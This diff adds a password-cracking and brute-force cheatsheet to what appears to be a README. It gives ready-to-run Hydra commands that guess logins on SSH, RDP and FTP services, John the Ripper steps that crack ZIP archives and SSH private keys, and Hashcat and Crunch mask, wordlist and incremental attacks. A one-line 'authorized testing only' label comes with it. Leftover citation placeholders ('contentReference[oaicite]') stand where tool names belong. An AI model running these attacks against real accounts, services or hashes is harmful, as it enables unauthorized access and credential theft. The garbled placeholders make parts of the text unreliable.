@@ -693,6 +693,413 @@ Open new terminal and run:
 cloudflared tunnel --url http://localhost:8080
 ```
 
+# Password Cracking & Brute Force Cheatsheet
+
+> Educational and authorized security testing only.
+
+---
+
+# Hydra SSH Bruteforce
+
+Using :contentReference[oaicite:0]{index=0}.
+
+## Single Username + Wordlist
+
+```bash
+hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
+```
+
+---
+
+## Multiple Usernames + Passwords
+
+```bash
+hydra -L users.txt -P passwords.txt ssh://192.168.1.10
+```
+
+---
+
+## Custom Port
+
+```bash
+hydra -l admin -P passwords.txt ssh://192.168.1.10 -s 2222
+```
+
+---
+
+## Fast Threads
+
+```bash
+hydra -l root -P rockyou.txt -t 16 ssh://192.168.1.10
+```
+
+---
+
+# Hydra SSH Wordlist Pattern Attack
+
+## Generate Wordlist with Crunch
+
+Using :contentReference[oaicite:1]{index=1}.
+
+```bash
+crunch 6 6 abc123 -o wordlist.txt
+```
+
+---
+
+## Use Generated Wordlist
+
+```bash
+hydra -l kali -P wordlist.txt ssh://192.168.1.10
+```
+
+---
+
+# Hydra RDP Bruteforce
+
+```bash
+hydra -l administrator -P rockyou.txt rdp://192.168.1.10
+```
+
+---
+
+# Hydra FTP Bruteforce
+
+```bash
+hydra -l ftpuser -P rockyou.txt ftp://192.168.1.10
+```
+
+---
+
+# Hydra FTP Multiple Users
+
+```bash
+hydra -L users.txt -P passwords.txt ftp://192.168.1.10
+```
+
+---
+
+# John ZIP Password Cracking
+
+Using :contentReference[oaicite:2]{index=2}.
+
+## Convert ZIP to Hash
+
+```bash
+zip2john secret.zip > zip.hash
+```
+
+---
+
+## Crack ZIP Password
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
+```
+
+---
+
+## Show Password
+
+```bash
+john --show zip.hash
+```
+
+---
+
+# John SSH RSA Key Cracking
+
+## Convert SSH Key
+
+```bash
+python3 /usr/share/john/ssh2john.py id_rsa > ssh.hash
+```
+
+---
+
+## Crack SSH Key
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
+```
+
+---
+
+## Show Password
+
+```bash
+john --show ssh.hash
+```
+
+---
+
+# John Incremental Bruteforce
+
+## Basic Incremental
+
+```bash
+john --format=raw-md5 --incremental hash.txt
+```
+
+---
+
+## Digits Only
+
+```bash
+john --incremental=Digits hash.txt
+```
+
+---
+
+## Lowercase Only
+
+```bash
+john --incremental=Lower hash.txt
+```
+
+---
+
+## Alphanumeric
+
+```bash
+john --incremental=Alnum hash.txt
+```
+
+---
+
+## Maximum Length
+
+```bash
+john --incremental --max-length=6 hash.txt
+```
+
+---
+
+## Minimum Length
+
+```bash
+john --incremental --min-length=4 hash.txt
+```
+
+---
+
+## Multi-Core Cracking
+
+```bash
+john --fork=4 --incremental hash.txt
+```
+
+---
+
+# Hashcat Wordlist Attack
+
+Using :contentReference[oaicite:3]{index=3}.
+
+```bash
+hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+---
+
+# Common Hash Modes
+
+| Hash Type | Mode |
+|---|---|
+| MD5 | 0 |
+| SHA1 | 100 |
+| SHA256 | 1400 |
+| bcrypt | 3200 |
+| NTLM | 1000 |
+| ZIP | 13600 |
+| WPA/WPA2 | 22000 |
+
+---
+
+# Hashcat Masks
+
+| Mask | Meaning |
+|---|---|
+| ?l | lowercase |
+| ?u | uppercase |
+| ?d | digits |
+| ?s | symbols |
+| ?a | all characters |
+
+---
+
+# Hashcat Bruteforce Examples
+
+## 4-digit PIN
+
+```bash
+hashcat -m 0 -a 3 hash.txt ?d?d?d?d
+```
+
+---
+
+## Lowercase Password
+
+```bash
+hashcat -m 0 -a 3 hash.txt ?l?l?l?l?l?l
+```
+
+---
+
+## Mixed Password
+
+```bash
+hashcat -m 0 -a 3 hash.txt ?u?l?l?l?d?d
+```
+
+---
+
+## Full Charset
+
+```bash
+hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a
+```
+
+---
+
+# Hashcat Incremental Attack
+
+```bash
+hashcat -m 0 -a 3 --increment hash.txt ?a?a?a?a?a?a
+```
+
+---
+
+# Hashcat Optimized Kernel
+
+```bash
+hashcat -m 0 -a 3 -O hash.txt ?a?a?a?a
+```
+
+---
+
+# Generate Wordlists with Hashcat
+
+## Numeric Wordlist
+
+```bash
+hashcat -a 3 ?d?d?d?d --stdout
+```
+
+---
+
+## Save Numeric Wordlist
+
+```bash
+hashcat -a 3 ?d?d?d?d --stdout > pin.txt
+```
+
+---
+
+## Lowercase + Digits
+
+```bash
+hashcat -a 3 ?l?l?l?l?d?d --stdout
+```
+
+---
+
+## Custom Charset
+
+```bash
+hashcat -1 abc123 ?1?1?1?1 --stdout
+```
+
+---
+
+## Name + Year Pattern
+
+```bash
+hashcat -a 3 karthi?d?d?d?d --stdout
+```
+
+---
+
+# Crunch Wordlist Generation
+
+## 4-digit PINs
+
+```bash
+crunch 4 4 0123456789 -o pin.txt
+```
+
+---
+
+## Lowercase Passwords
+
+```bash
+crunch 6 6 abcdefghijklmnopqrstuvwxyz -o lower.txt
+```
+
+---
+
+## Pattern-Based Wordlist
+
+```bash
+crunch 6 6 -t @@%%%% -o pattern.txt
+```
+
+| Symbol | Meaning |
+|---|---|
+| @ | lowercase |
+| , | uppercase |
+| % | digits |
+| ^ | symbols |
+
+---
+
+# Useful Commands
+
+## View Hashcat GPU Devices
+
+```bash
+hashcat -I
+```
+
+---
+
+## Benchmark Hashcat
+
+```bash
+hashcat -b
+```
+
+---
+
+## Restore Session
+
+```bash
+hashcat --restore
+```
+
+---
+
+## Show Cracked Passwords
+
+```bash
+hashcat --show hash.txt
+```
+
+---
+
+# RockYou Wordlist Path
+
+```bash
+/usr/share/wordlists/rockyou.txt
+```
+
+---
+
+# Extract RockYou
+
+```bash
+sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
+```
+
 
 
 # ⚠️ Disclaimer
